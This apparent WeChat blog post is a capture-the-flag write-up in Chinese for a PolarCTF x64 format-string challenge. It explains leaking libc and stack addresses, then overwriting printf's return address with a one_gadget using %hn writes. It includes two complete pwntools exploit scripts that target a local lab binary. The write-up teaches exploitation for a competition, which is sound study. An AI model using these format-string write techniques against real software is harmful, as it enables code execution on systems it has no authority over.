---
title: web选手入门pwn(35)——bllhl_fmt
url: https://mp.weixin.qq.com/s/CWLksKhWkrupvSRlaHADVg
source: Doonsec's feed
date: 2026-04-17
fetch_date: 2026-04-18T04:28:37.469452
---

# web选手入门pwn(35)——bllhl_fmt

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Be2IPichjh3PKuFXWOYEdrNDmiajIWpTLsalYVqjBwMm8LPyIZ6jVuQhgiarmZS780xfgqkan1WBsYh8uLLKXuictPwZcCnH6u2ThtZRNaiaO2L4/0?wx_fmt=jpeg)

# web选手入门pwn(35)——bllhl\_fmt

原创

珂字辈
珂字辈

珂技知识分享

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

基础x64字符串格式化题，这题做不出来基本就告别字符串格式化了。

https://www.polarctf.com/#/page/challenges

给了libc 2.35，和以下环境一致。

roderickchan/debug\_pwn\_env:22.04-2.35-0ubuntu3.8-20240601

保护全绿，看代码。

![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3MYqDBVDRbSicyVK2Ln40KeV9bH2n6kIgtVdjic4trs6mpXLBsCHRLYia1nKa3eL09mLoOwdY9rBImE9yQPpug0PFl5SfSDGwrwZo/640?wx_fmt=png&from=appmsg)

非常直接的字符串格式化，随便试试。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3MmzibtO6bncP8pXtCHFEMuJWmznoibCcmAWANCDOaBJu4gI7dcCXU1ARvg3ZXa3NUhrCj8MkSBe2BUWDombRVbriaxgpusWnlE7s/640?wx_fmt=png&from=appmsg)

那么跟进去看看栈，能利用%n$p泄露什么地址出来。

![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3NJNSiaz555I3bOeBBhxCZJwdqdhcZl1F03ibnWxxKibpJKuDMNgzmV4NrMQt1HuXV4eXLPPhIp2Ene0sxcG8XKOXsUVZ9hxIZOyQ/640?wx_fmt=png&from=appmsg)

可以看到%1$p就是stdin\_+131，也就是libc，之前随便试试的时候就已经看到这个地址了。

泄露了libc之后栈地址呢？得%n$p，n很大才能泄露，我们可以直接用经典的environ来泄露。它是libc上的一个地址，稳定存储着栈地址。

![](https://mmbiz.qpic.cn/mmbiz_png/Be2IPichjh3Mjk0WsFNGXiaO6V7FOBHuvJvUwQe6wib1iamib6ibRrAGR4t4Iaib2OwQ20zqibmlIv2JQichtubicOblyEJbTkLbMztmpicN11qGpaVvb0/640?wx_fmt=png&from=appmsg)

字符串格式化泄露任意地址上的值当然是经典的%s，先输入p64(environ)，此时它会存储在栈上，再用%n$s将其视为参数打印出来即可。

在x64中，由于printf会截断\x00，所以%n$s必须放在最左边，然后根据padding的量来调整n。代码如下。

```
from pwn import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = process("./pwn1")#gdb.attach(sh, "b *0x555555555293\n c\n c\n c")#sh = remote("1.95.36.136", xxxx)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("say", "%1$p")libc_N = int(sh.recvuntil(b"hello")[-18:-6].decode(), 16)libc_base = libc_N - 131 - libc.sym['_IO_2_1_stdin_']print("libc_base: " + hex(libc_base))
environ = libc.sym['environ'] + libc_baseprint("environ: " + hex(environ))
sh.sendlineafter("say", b"%8$sAAAA" + p64(environ))stack_N = u64(sh.recvuntil("\x7f")[-6:]+b"\x00\x00")print("stack_N: " + hex(stack_N))
sh.interactive()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3NbEr9ae0e3x0XmNXf6WaEb3v9Nb64wOCwatAiaQQbYbUib11Ua79SQB9Xrt2kLbxQ9kmKbekY75kwF1Z7hxkGDIkbK8qShoZFMo/640?wx_fmt=png&from=appmsg)

可以看到成功泄露libc和栈，有了栈，省事点就肯定走one\_gadget或者ROP链那一套，但应该改写哪个ret呢？代码可是在while(1)中无限循环的啊。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3PPcUmnxTU1uJFFKicTw3Gp4x0t4aHbFFYicSuXMQ7TibaK0U3l3kdbiazPSdU3VeslrngdvZIEWuDIhpcCu64ib4SacEhOicSqQWic0c/640?wx_fmt=png&from=appmsg)

当然是printf自己的ret地址，经过调试，发现它跟stack\_N相差0x250

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3NtA2HJzz7iaG979aSXYa09rFqoRwYhIyB3k4WiaLnWjp85fnloGwhgDYVENlwlkAoqCxkTJia9NlBN9qRvPbFbq3qy2QAXTAVfcs/640?wx_fmt=png&from=appmsg)

那么接下来就是利用%c结合%n改栈了，之前做过同libc的题，这题用one比较简单，然后也不用节约payload长度，全部用%hn。

构造payload的原理如下，先通过%16c输出0x10长度的字符串，再用%13$hn来改写第13个参数上的值，第13个参数我们可以控制为p64(printf\_ret)，假如它原本的值是0x0000，会被我们改写成0x0010。

接着改写p64(printf\_ret+2)，也就是%14$hn，假如我们想改写成0x222，那就输入%530c，530=0x222-0x10，p64(printf\_ret+2)就会被修改成0x0222。

最后是p64(printf\_ret+4)，也就是%15$hn，这次如果我们想改写成0x111，比上一次0x222要小，就只能负数溢出，输入%65263c，65263=0x111+0x10000-0x222。

如果用%hhn，改写一个x64地址payload就翻倍了，更麻烦。

如果用%n，%xxxc中的xxx将非常庞大，终端将输出一个巨大的数，x64上根本行不通。所以折中%hn是最好的。

最终payload如下

```
from pwn import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = process("./pwn1")#gdb.attach(sh, "b *0x555555555293\n c\n c\n c")#sh = remote("1.95.36.136", xxxx)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("say", "%1$p")libc_N = int(sh.recvuntil(b"hello")[-18:-6].decode(), 16)libc_base = libc_N - 131 - libc.sym['_IO_2_1_stdin_']print("libc_base: " + hex(libc_base))
environ = libc.sym['environ'] + libc_baseones = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]one = ones[1] + libc_baseprint("one: " + hex(one))
sh.sendlineafter("say", b"%8$sAAAA" + p64(environ))stack_N = u64(sh.recvuntil("\x7f")[-6:]+b"\x00\x00")printf_ret = stack_N - 0x250print(hex(stack_N))print(hex(printf_ret))
one_1 = int(("0x"+str(hex(one))[-4:]),16)one_2 = int(("0x"+str(hex(one))[-8:-4]),16)one_3 = int(("0x"+str(hex(one))[-12:-8]),16)
def fmt_pad(a, b):    if a >= b:        return a - b    else:        return a + 0x10000 - b
payload = ""payload += "%" + str(fmt_pad(one_1, 8)) + "c%13$hn"payload += "%" + str(fmt_pad(one_2, one_1)) + "c%14$hn"payload += "%" + str(fmt_pad(one_3, one_2)) + "c%15$hn"payload = payload.ljust(48,"A").encode()payload += p64(printf_ret)payload += p64(printf_ret+2)payload += p64(printf_ret+4)
#b *0x7ffff7dee7b6sh.sendlineafter("say", payload)
sh.interactive()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Be2IPichjh3MWwTniafGPreP6v12EYRGLKMEgfFT9kJ9j24jPth2uhmqHS3JHxH7gibDMubKFiaEYwLQUlHgSxUHQI6JeE4dChUGyPkyZfHDE34/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5DkxONnl4IXp6JROfSCrsHKeW7xFnuIOY2WkxOOoe9eq6dibyubyibEnoGWibWF7gDc8mzo5nQfuJrg/0?wx_fmt=png)

珂技知识分享

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5DkxONnl4IXp6JROfSCrsHKeW7xFnuIOY2WkxOOoe9eq6dibyubyibEnoGWibWF7gDc8mzo5nQfuJrg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过